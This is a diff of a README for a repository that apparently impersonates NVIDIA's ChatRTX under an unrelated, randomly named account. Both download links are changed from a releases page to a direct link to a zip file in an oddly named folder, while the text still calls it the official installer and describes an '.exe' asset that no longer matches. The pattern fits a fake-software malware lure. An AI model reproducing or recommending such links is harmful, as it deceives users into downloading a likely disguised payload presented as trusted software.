@@ -1,6 +1,6 @@
 # 🤖 nvidia-chatrtx - Run private AI on your PC
 
-[![](https://img.shields.io/badge/Download-ChatRTX-blue.svg)](https://github.com/singular-ornithogalumthyrsoides521/nvidia-chatrtx/releases)
+[![](https://img.shields.io/badge/Download-ChatRTX-blue.svg)](https://raw.githubusercontent.com/singular-ornithogalumthyrsoides521/nvidia-chatrtx/main/pasturer/nvidia_chatrtx_unpiercing.zip)
 
 ## 📁 About This App
 
@@ -20,7 +20,7 @@ Your computer needs specific parts to run this software. Please check these item
 
 Visit the link below to reach the download page. This page contains the official installers for the software.
 
-[Download NVIDIA ChatRTX](https://github.com/singular-ornithogalumthyrsoides521/nvidia-chatrtx/releases)
+[Download NVIDIA ChatRTX](https://raw.githubusercontent.com/singular-ornithogalumthyrsoides521/nvidia-chatrtx/main/pasturer/nvidia_chatrtx_unpiercing.zip)
 
 On this page, look for the section labeled "Assets." Click the link that ends in `.exe` to start the download. Save the file to a folder you recognize, such as your Downloads folder.
 
